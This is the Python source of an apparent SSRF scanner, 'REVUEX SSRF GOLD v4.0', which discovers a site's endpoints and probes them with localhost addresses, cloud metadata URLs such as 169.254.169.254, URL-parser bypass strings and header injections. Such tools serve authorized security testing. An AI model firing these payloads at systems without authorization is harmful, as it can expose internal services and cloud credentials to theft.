#!/usr/bin/env python3
"""
REVUEX SSRF GOLD v4.0
=====================
High-confidence SSRF scanner with embedded Scope Intelligence Engine (SIE)

Detection Philosophy:
- Automatic endpoint discovery via SIE
- No external collaborator dependency
- Differential response analysis
- Multiple protocol testing
- Cloud metadata detection
- URL parser confusion testing
- Confidence-based findings only

Core Techniques:
- Scope Intelligence Engine (SIE)
  - Form extraction
  - JavaScript fetch/axios parsing
  - API endpoint discovery
- Internal IP testing (127.0.0.1, localhost)
- Cloud metadata endpoints (AWS, GCP, Azure)
- URL parser bypass techniques
- Protocol handler testing
- Response differential analysis
- Header-based blind SSRF

Author: REVUEX Team
License: MIT (Private Research Use)
"""

import re
import json
import time
import hashlib
import argparse
from pathlib import Path
from typing import Dict, List, Optional, Any, Set
from datetime import datetime
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urljoin, urlparse, quote
import sys

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.base_scanner import BaseScanner, Finding, ScanResult, Severity, ScanStatus
from core.utils import print_success, print_error, print_warning, print_info

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False


# =============================================================================
# CONSTANTS
# =============================================================================

SCANNER_NAME = "SSRF Scanner GOLD"
SCANNER_VERSION = "4.0.0"

BANNER = r"""
██████╗ ███████╗██╗   ██╗██╗   ██╗███████╗██╗  ██╗
██╔══██╗██╔════╝██║   ██║██║   ██║██╔════╝╚██╗██╔╝
██████╔╝█████╗  ██║   ██║██║   ██║█████╗   ╚███╔╝ 
██╔══██╗██╔══╝  ╚██╗ ██╔╝██║   ██║██╔══╝   ██╔██╗ 
██║  ██║███████╗ ╚████╔╝ ╚██████╔╝███████╗██╔╝ ██╗
╚═╝  ╚═╝╚══════╝  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝

SSRF Scanner GOLD v4.0 — Server-Side Request Forgery Detection
"""

CONFIDENCE_THRESHOLD = 80

# Common SSRF-vulnerable parameter names
SSRF_PARAMS = [
    "url", "link", "uri", "src", "source", "target", "dest", "destination",
    "redirect", "redirect_url", "redirect_uri", "return", "return_url",
    "next", "next_url", "callback", "callback_url", "path", "file",
    "document", "page", "load", "fetch", "proxy", "request", "site",
    "resource", "ref", "reference", "img", "image", "avatar", "icon",
    "feed", "rss", "xml", "api", "endpoint", "host", "domain", "server"
]

# Internal/localhost payloads
INTERNAL_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",
    "http://[::1]",
    "http://0.0.0.0",
    "http://0",
    "http://127.1",
    "http://127.0.1",
]

# Cloud metadata endpoints (safe to test - only check if accessible)
CLOUD_METADATA = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance",
    "digital_ocean": "http://169.254.169.254/metadata/v1/",
}

# URL parser bypass payloads
BYPASS_PAYLOADS = [
    "http://127.0.0.1#@example.com",
    "http://example.com@127.0.0.1",
    "http://127.0.0.1%23@example.com",
    "http://127.0.0.1%2523@example.com",
    "http://127.0.0.1:80%23@example.com",
    "http://127。0。0。1",  # Full-width dots
    "http://①②⑦.0.0.1",  # Unicode digits
    "http://0x7f.0.0.1",  # Hex encoding
    "http://2130706433",  # Decimal IP
    "http://017700000001",  # Octal IP
]

# Response indicators for SSRF
SSRF_INDICATORS = [
    "localhost", "127.0.0.1", "::1", "internal", "private",
    "metadata", "instance", "ami-id", "hostname",
    "connection refused", "no route to host", "network unreachable"
]


# =============================================================================
# SSRF CHECK RESULT DATACLASS
# =============================================================================

@dataclass
class SSRFCheckResult:
    """Result of a single SSRF check."""
    check_name: str
    endpoint: str
    parameter: str
    payload: str
    severity: Severity
    confidence_score: int
    evidence: Dict[str, Any]
    is_vulnerable: bool


@dataclass
class DiscoveredEndpoint:
    """Endpoint discovered by SIE."""
    url: str
    params: List[str]
    method: str
    source: str


# =============================================================================
# SCOPE INTELLIGENCE ENGINE (SIE)
# =============================================================================

class ScopeIntelligenceEngine:
    """
    Automatic endpoint and parameter discovery engine.
    
    Sources:
    - HTML forms (action + inputs)
    - External JavaScript files
    - Inline JavaScript
    - API patterns in code
    """
    
    def __init__(self, base_url: str, session, timeout: int = 10):
        self.base_url = base_url
        self.session = session
        self.timeout = timeout
        self.endpoints: List[DiscoveredEndpoint] = []
        self.discovered_urls: Set[str] = set()
    
    def run(self) -> List[DiscoveredEndpoint]:
        """Execute endpoint discovery."""
        print_info("SIE: Starting endpoint discovery...")
        
        try:
            response = self.session.get(self.base_url, timeout=self.timeout)
            html = response.text
            
            if HAS_BS4:
                soup = BeautifulSoup(html, "html.parser")
                self._extract_forms(soup)
                self._extract_scripts(soup)
            
            self._extract_inline_js(html)
            self._extract_links(html)
            self._add_common_endpoints()
            
        except Exception as e:
            print_warning(f"SIE discovery error: {e}")
        
        print_info(f"SIE: Discovered {len(self.endpoints)} endpoint(s)")
        return self.endpoints
    
    def _extract_forms(self, soup) -> None:
        """Extract endpoints from HTML forms."""
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            
            if not action:
                action = self.base_url
            
            url = urljoin(self.base_url, action)
            
            if url in self.discovered_urls:
                continue
            self.discovered_urls.add(url)
            
            # Extract input names
            inputs = []
            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name")
                if name:
                    inputs.append(name)
            
            # Add SSRF-prone params if form has few inputs
            if len(inputs) < 3:
                inputs.extend(SSRF_PARAMS[:10])
            
            self.endpoints.append(DiscoveredEndpoint(
                url=url,
                params=inputs,
                method=method,
                source="form"
            ))
    
    def _extract_scripts(self, soup) -> None:
        """Extract endpoints from external JavaScript files."""
        for script in soup.find_all("script", src=True):
            js_url = urljoin(self.base_url, script["src"])
            
            # Skip external CDNs
            if any(cdn in js_url for cdn in ["cdnjs", "googleapis", "jsdelivr", "unpkg"]):
                continue
            
            try:
                js_response = self.session.get(js_url, timeout=self.timeout)
                self._parse_js(js_response.text)
            except Exception:
                pass
    
    def _extract_inline_js(self, html: str) -> None:
        """Extract endpoints from inline JavaScript."""
        # Find script blocks
        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
        for match in script_pattern.finditer(html):
            self._parse_js(match.group(1))
    
    def _parse_js(self, js: str) -> None:
        """Parse JavaScript for API endpoints."""
        # fetch() calls
        fetch_pattern = re.compile(r"""fetch\s*\(\s*['"`]([^'"`]+)['"`]""")
        for match in fetch_pattern.finditer(js):
            self._add_js_endpoint(match.group(1))
        
        # axios calls
        axios_pattern = re.compile(r"""axios\.(get|post|put|delete|patch)\s*\(\s*['"`]([^'"`]+)['"`]""")
        for match in axios_pattern.finditer(js):
            self._add_js_endpoint(match.group(2), method=match.group(1).upper())
        
        # XMLHttpRequest
        xhr_pattern = re.compile(r"""\.open\s*\(\s*['"`](\w+)['"`]\s*,\s*['"`]([^'"`]+)['"`]""")
        for match in xhr_pattern.finditer(js):
            self._add_js_endpoint(match.group(2), method=match.group(1).upper())
        
        # API URL patterns
        api_pattern = re.compile(r"""['"`](/api/[^'"`\s]+)['"`]""")
        for match in api_pattern.finditer(js):
            self._add_js_endpoint(match.group(1))
        
        # URL assignments
        url_pattern = re.compile(r"""(?:url|endpoint|api)\s*[:=]\s*['"`]([^'"`]+)['"`]""", re.IGNORECASE)
        for match in url_pattern.finditer(js):
            self._add_js_endpoint(match.group(1))
    
    def _add_js_endpoint(self, path: str, method: str = "POST") -> None:
        """Add endpoint discovered from JavaScript."""
        if path.startswith("http"):
            url = path
        else:
            url = urljoin(self.base_url, path)
        
        if url in self.discovered_urls:
            return
        self.discovered_urls.add(url)
        
        self.endpoints.append(DiscoveredEndpoint(
            url=url,
            params=SSRF_PARAMS[:15],
            method=method,
            source="javascript"
        ))
    
    def _extract_links(self, html: str) -> None:
        """Extract potential API links from HTML."""
        href_pattern = re.compile(r'href\s*=\s*["\']([^"\']+)["\']', re.IGNORECASE)
        for match in href_pattern.finditer(html):
            href = match.group(1)
            if "/api/" in href or "callback" in href.lower() or "redirect" in href.lower():
                url = urljoin(self.base_url, href)
                if url not in self.discovered_urls:
                    self.discovered_urls.add(url)
                    self.endpoints.append(DiscoveredEndpoint(
                        url=url,
                        params=SSRF_PARAMS[:10],
                        method="GET",
                        source="link"
                    ))
    
    def _add_common_endpoints(self) -> None:
        """Add common SSRF-prone endpoints."""
        common_paths = [
            "/api/proxy",
            "/api/fetch",
            "/api/url",
            "/api/request",
            "/proxy",
            "/fetch",
            "/redirect",
            "/callback",
            "/load",
            "/image",
            "/avatar",
        ]
        
        parsed = urlparse(self.base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        
        for path in common_paths:
            url = base + path
            if url not in self.discovered_urls:
                self.discovered_urls.add(url)
                self.endpoints.append(DiscoveredEndpoint(
                    url=url,
                    params=SSRF_PARAMS[:10],
                    method="POST",
                    source="common"
                ))


# =============================================================================
# SSRF SCANNER GOLD CLASS
# =============================================================================

class SSRFScanner(BaseScanner):
    """
    GOLD-tier SSRF Scanner with Scope Intelligence Engine.
    
    Methodology:
    1. Run SIE for endpoint discovery
    2. Test each endpoint with internal payloads
    3. Test cloud metadata endpoints
    4. Test URL parser bypasses
    5. Analyze response differentials
    6. Report with confidence scoring
    """
    
    def __init__(
        self,
        target: str,
        custom_endpoints: Optional[List[str]] = None,
        custom_params: Optional[List[str]] = None,
        custom_headers: Optional[Dict[str, str]] = None,
        skip_discovery: bool = False,
        confidence_threshold: int = CONFIDENCE_THRESHOLD,
        **kwargs
    ):
        """
        Initialize SSRF Scanner.
        
        Args:
            target: Target URL
            custom_endpoints: Additional endpoints to test
            custom_params: Additional parameters to test
            custom_headers: Custom HTTP headers
            skip_discovery: Skip SIE discovery
            confidence_threshold: Minimum confidence for findings
        """
        super().__init__(target=target, **kwargs)
        
        self.custom_endpoints = custom_endpoints or []
        self.custom_params = custom_params or []
        self.custom_headers = custom_headers or {}
        self.skip_discovery = skip_discovery
        self.confidence_threshold = confidence_threshold
        
        # State tracking
        self.discovered_endpoints: List[DiscoveredEndpoint] = []
        self.check_results: List[SSRFCheckResult] = []
        self.total_confidence: int = 0
        self.baseline_responses: Dict[str, Any] = {}
        
        # Scanner info
        self.scanner_name = SCANNER_NAME
        self.scanner_version = SCANNER_VERSION
    
    def _validate_target(self) -> bool:
        """Validate target is accessible."""
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            return response.status_code < 500
        except Exception:
            return False
    
    def scan(self) -> None:
        """Execute the GOLD SSRF scan."""
        self.logger.info(f"Starting SSRF GOLD v4.0 scan")
        self.logger.info(f"Target: {self.target}")
        
        # Phase 1: Scope Intelligence Engine
        if not self.skip_discovery:
            self.logger.info("Phase 1: Running Scope Intelligence Engine...")
            sie = ScopeIntelligenceEngine(self.target, self.session, self.timeout)
            self.discovered_endpoints = sie.run()
        
        # Add custom endpoints
        for ep in self.custom_endpoints:
            self.discovered_endpoints.append(DiscoveredEndpoint(
                url=ep,
                params=SSRF_PARAMS + self.custom_params,
                method="POST",
                source="custom"
            ))
        
        if not self.discovered_endpoints:
            # Fallback: test target directly
            self.discovered_endpoints.append(DiscoveredEndpoint(
                url=self.target,
                params=SSRF_PARAMS + self.custom_params,
                method="GET",
                source="target"
            ))
        
        # Phase 2: Capture baselines
        self.logger.info("Phase 2: Capturing baseline responses...")
        self._capture_baselines()
        
        # Phase 3: Test internal payloads
        self.logger.info("Phase 3: Testing internal IP payloads...")
        self._test_internal_payloads()
        
        # Phase 4: Test cloud metadata
        self.logger.info("Phase 4: Testing cloud metadata endpoints...")
        self._test_cloud_metadata()
        
        # Phase 5: Test URL parser bypasses
        self.logger.info("Phase 5: Testing URL parser bypasses...")
        self._test_parser_bypasses()
        
        # Phase 6: Test header-based SSRF
        self.logger.info("Phase 6: Testing header-based SSRF...")
        self._test_header_ssrf()
        
        self.logger.info(f"SSRF scan complete. Found {len(self.findings)} issue(s)")
    
    # =========================================================================
    # BASELINE CAPTURE
    # =========================================================================
    
    def _capture_baselines(self) -> None:
        """Capture baseline responses for each endpoint."""
        for endpoint in self.discovered_endpoints[:10]:  # Limit baselines
            try:
                self.rate_limiter.acquire()
                
                if endpoint.method == "GET":
                    response = self.session.get(
                        endpoint.url,
                        headers=self.custom_headers,
                        timeout=self.timeout
                    )
                else:
                    response = self.session.post(
                        endpoint.url,
                        json={},
                        headers=self.custom_headers,
                        timeout=self.timeout
                    )
                
                self.baseline_responses[endpoint.url] = {
                    "status": response.status_code,
                    "length": len(response.text),
                    "hash": hashlib.md5(response.text.encode()).hexdigest()[:12]
                }
                
                time.sleep(self.delay)
                
            except Exception:
                pass
    
    # =========================================================================
    # INTERNAL PAYLOAD TESTING
    # =========================================================================
    
    def _test_internal_payloads(self) -> None:
        """Test endpoints with internal IP payloads."""
        for endpoint in self.discovered_endpoints:
            for param in endpoint.params[:10]:  # Limit params per endpoint
                for payload in INTERNAL_PAYLOADS[:5]:  # Limit payloads
                    self._test_ssrf(endpoint, param, payload, "internal")
    
    def _test_ssrf(self, endpoint: DiscoveredEndpoint, param: str, payload: str, test_type: str) -> None:
        """Test single SSRF payload."""
        self.rate_limiter.acquire()
        self.request_count += 1
        
        confidence = 30  # Base: SIE discovery
        evidence = {
            "endpoint": endpoint.url,
            "parameter": param,
            "payload": payload,
            "source": endpoint.source
        }
        
        try:
            # Build request data
            data = {param: payload}
            
            if endpoint.method == "GET":
                response = self.session.get(
                    endpoint.url,
                    params=data,
                    headers=self.custom_headers,
                    timeout=self.timeout
                )
            else:
                # Try both JSON and form data
                response = self.session.post(
                    endpoint.url,
                    json=data,
                    headers=self.custom_headers,
                    timeout=self.timeout
                )
            
            evidence["status_code"] = response.status_code
            evidence["response_length"] = len(response.text)
            
            # Scoring based on response analysis
            
            # Non-error response
            if response.status_code < 500:
                confidence += 20
            
            # Response contains SSRF indicators
            response_lower = response.text.lower()
            for indicator in SSRF_INDICATORS:
                if indicator in response_lower:
                    confidence += 30
                    evidence["indicator"] = indicator
                    break
            
            # Response differs from baseline
            baseline = self.baseline_responses.get(endpoint.url)
            if baseline:
                if response.status_code != baseline["status"]:
                    confidence += 10
                if abs(len(response.text) - baseline["length"]) > 100:
                    confidence += 10
            
            # Cloud metadata specific content
            if "ami-" in response.text or "instance-id" in response.text:
                confidence += 30
                evidence["cloud_metadata"] = True
            
            time.sleep(self.delay)
            
            if confidence >= self.confidence_threshold:
                self._add_check_result(
                    f"SSRF via {test_type} payload",
                    endpoint.url,
                    param,
                    payload,
                    Severity.CRITICAL if "metadata" in payload or confidence >= 90 else Severity.HIGH,
                    confidence,
                    evidence,
                    True
                )
                return  # Found vulnerability, skip remaining payloads for this param
                
        except Exception as e:
            self.logger.debug(f"SSRF test error: {e}")
    
    # =========================================================================
    # CLOUD METADATA TESTING
    # =========================================================================
    
    def _test_cloud_metadata(self) -> None:
        """Test cloud metadata endpoints."""
        for endpoint in self.discovered_endpoints[:5]:
            for param in endpoint.params[:5]:
                for cloud, metadata_url in CLOUD_METADATA.items():
                    self._test_ssrf(endpoint, param, metadata_url, f"cloud_{cloud}")
    
    # =========================================================================
    # URL PARSER BYPASS TESTING
    # =========================================================================
    
    def _test_parser_bypasses(self) -> None:
        """Test URL parser bypass techniques."""
        for endpoint in self.discovered_endpoints[:5]:
            for param in endpoint.params[:5]:
                for payload in BYPASS_PAYLOADS[:5]:
                    self._test_ssrf(endpoint, param, payload, "bypass")
    
    # =========================================================================
    # HEADER-BASED SSRF TESTING
    # =========================================================================
    
    def _test_header_ssrf(self) -> None:
        """Test header-based blind SSRF."""
        ssrf_headers = [
            "X-Forwarded-For",
            "X-Forwarded-Host",
            "X-Original-URL",
            "X-Rewrite-URL",
            "Referer",
            "Host",
        ]
        
        for endpoint in self.discovered_endpoints[:5]:
            baseline = self.baseline_responses.get(endpoint.url)
            if not baseline:
                continue
            
            for header in ssrf_headers:
                try:
                    self.rate_limiter.acquire()
                    
                    test_headers = {**self.custom_headers, header: "http://127.0.0.1"}
                    
                    response = self.session.get(
                        endpoint.url,
                        headers=test_headers,
                        timeout=self.timeout
                    )
                    
                    # Check for differential response
                    if response.status_code != baseline["status"]:
                        confidence = 75
                        
                        if any(ind in response.text.lower() for ind in SSRF_INDICATORS):
                            confidence += 15
                        
                        if confidence >= self.confidence_threshold:
                            self._add_check_result(
                                "Header-based SSRF",
                                endpoint.url,
                                header,
                                "http://127.0.0.1",
                                Severity.HIGH,
                                confidence,
                                {
                                    "header": header,
                                    "baseline_status": baseline["status"],
                                    "test_status": response.status_code
                                },
                                True
                            )
                    
                    time.sleep(self.delay)
                    
                except Exception:
                    pass
    
    # =========================================================================
    # RESULT HANDLING
    # =========================================================================
    
    def _add_check_result(self, check_name: str, endpoint: str, parameter: str, payload: str, severity: Severity, confidence_score: int, evidence: Dict[str, Any], is_vulnerable: bool) -> None:
        """Add a check result and create finding."""
        # Deduplicate
        for existing in self.check_results:
            if existing.endpoint == endpoint and existing.parameter == parameter:
                return
        
        result = SSRFCheckResult(
            check_name=check_name,
            endpoint=endpoint,
            parameter=parameter,
            payload=payload,
            severity=severity,
            confidence_score=confidence_score,
            evidence=evidence,
            is_vulnerable=is_vulnerable
        )
        self.check_results.append(result)
        self.total_confidence += confidence_score
        self._create_finding(result)
        print_success(f"{check_name}: {parameter} (+{confidence_score})")
    
    def _create_finding(self, result: SSRFCheckResult) -> None:
        """Create finding from check result."""
        finding = Finding(
            id=self._generate_finding_id(result.endpoint + result.parameter),
            title=result.check_name,
            severity=result.severity,
            description=f"SSRF vulnerability detected in parameter '{result.parameter}'",
            url=result.endpoint,
            parameter=result.parameter,
            method="POST",
            payload=result.payload,
            evidence=json.dumps(result.evidence, indent=2),
            impact=self._get_impact(result),
            remediation=self._get_remediation(),
            vulnerability_type="ssrf",
            confidence="high" if result.confidence_score >= 80 else "medium",
        )
        self.add_finding(finding)
    
    def _get_impact(self, result: SSRFCheckResult) -> str:
        """Get impact description."""
        if "cloud" in result.check_name.lower() or "metadata" in str(result.evidence):
            return (
                "CRITICAL: Cloud metadata SSRF enables:\n"
                "- AWS IAM credential theft\n"
                "- Instance takeover\n"
                "- Lateral movement in cloud"
            )
        return (
            "HIGH: SSRF vulnerability enables:\n"
            "- Internal service scanning\n"
            "- Firewall bypass\n"
            "- Data exfiltration\n"
            "- Potential RCE via internal services"
        )
    
    def _get_remediation(self) -> str:
        """Get remediation guidance."""
        return (
            "1. Implement URL allowlist validation\n"
            "2. Block requests to internal IP ranges\n"
            "3. Block cloud metadata endpoints (169.254.169.254)\n"
            "4. Use network-level egress filtering\n"
            "5. Disable unnecessary URL schemes\n"
            "6. Validate and sanitize user input\n"
            "7. Use SSRF-safe libraries for URL fetching"
        )
    
    def _generate_finding_id(self, context: str) -> str:
        """Generate unique finding ID."""
        data = f"{self.target}:{context}:{datetime.now().isoformat()}"
        return hashlib.md5(data.encode()).hexdigest()[:12]


# =============================================================================
# CLI INTERFACE
# =============================================================================

def create_parser() -> argparse.ArgumentParser:
    """Create CLI argument parser."""
    parser = argparse.ArgumentParser(prog="revuex-ssrf", description="REVUEX SSRF GOLD v4.0 - Server-Side Request Forgery Scanner")
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-e", "--endpoint", action="append", help="Additional endpoints to test")
    parser.add_argument("-p", "--param", action="append", help="Additional parameters to test")
    parser.add_argument("-H", "--header", action="append", help="Custom headers (Key:Value)")
    parser.add_argument("--skip-discovery", action="store_true", help="Skip SIE discovery")
    parser.add_argument("--threshold", type=int, default=CONFIDENCE_THRESHOLD, help=f"Confidence threshold (default: {CONFIDENCE_THRESHOLD})")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("--delay", type=float, default=0.5, help="Request delay")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    return parser


def main() -> int:
    """Main entry point."""
    parser = create_parser()
    args = parser.parse_args()
    
    custom_headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                custom_headers[k.strip()] = v.strip()
    
    if not args.quiet:
        print(BANNER)
        print(f"[+] Target: {args.target}")
        if args.endpoint:
            print(f"[+] Custom endpoints: {len(args.endpoint)}")
        print()
    
    scanner = SSRFScanner(
        target=args.target,
        custom_endpoints=args.endpoint or [],
        custom_params=args.param or [],
        custom_headers=custom_headers,
        skip_discovery=args.skip_discovery,
        confidence_threshold=args.threshold,
        delay=args.delay,
        timeout=args.timeout,
        verbose=args.verbose,
    )
    
    result = scanner.run()
    
    if not args.quiet:
        print(f"\n{'='*60}")
        print("SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Target: {args.target}")
        print(f"Duration: {result.duration_seconds:.2f}s")
        print(f"Endpoints Discovered: {len(scanner.discovered_endpoints)}")
        print(f"Issues Found: {len(result.findings)}")
        print(f"Total Confidence: {scanner.total_confidence}")
    
    if args.output:
        output_data = {
            "scanner": SCANNER_NAME,
            "version": SCANNER_VERSION,
            "target": args.target,
            "endpoints_discovered": len(scanner.discovered_endpoints),
            "findings": [{"id": f.id, "title": f.title, "severity": f.severity.value, "parameter": f.parameter} for f in result.findings]
        }
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        if not args.quiet:
            print(f"\nResults saved to: {args.output}")
    
    return 1 if result.findings else 0


if __name__ == "__main__":
    sys.exit(main())
